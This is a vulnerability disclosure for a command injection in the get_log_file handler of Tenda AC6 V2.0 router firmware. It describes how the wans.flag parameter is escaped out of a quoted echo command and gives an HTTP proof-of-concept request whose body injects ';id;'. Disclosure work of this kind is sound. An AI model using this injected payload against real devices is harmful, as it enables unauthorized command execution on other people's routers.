## Tenda AC6V2 get_log_file Command Injection via wans.flag

### Title

```
Tenda AC6 V2.0 get_log_file Command Injection via wans.flag
```

### Vendor / Product / Version

```
Tenda / AC6 V2.0 (AC1206) / Firmware V15.03.06.23
```

### Component

```
/bin/httpd — get_log_file handler (0x4462d0)
```

### CVSS 3.1

```
7.2 (High) CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
```

### Description

```
An OS command injection vulnerability exists in the get_log_file function
(0x4462d0) of /bin/httpd in Tenda AC6 V2.0 firmware V15.03.06.23.

The function reads the "wans.flag" parameter via websGetVar() and formats
it into 'echo "%s:" >> <logfile>' via doSystemCmd(). The double-quote
context can be escaped to inject arbitrary commands.

No known CVE covers this vulnerability.
```

### Proof of Concept

```http
POST /goform/getLogFile HTTP/1.1
Host: 192.168.0.1
Content-Type: application/x-www-form-urlencoded
Cookie: <valid_session>

wans.flag=";id;"
```

### Credit

```
Discovered by ST4R using FirmRec automated symbolic execution engine.
```

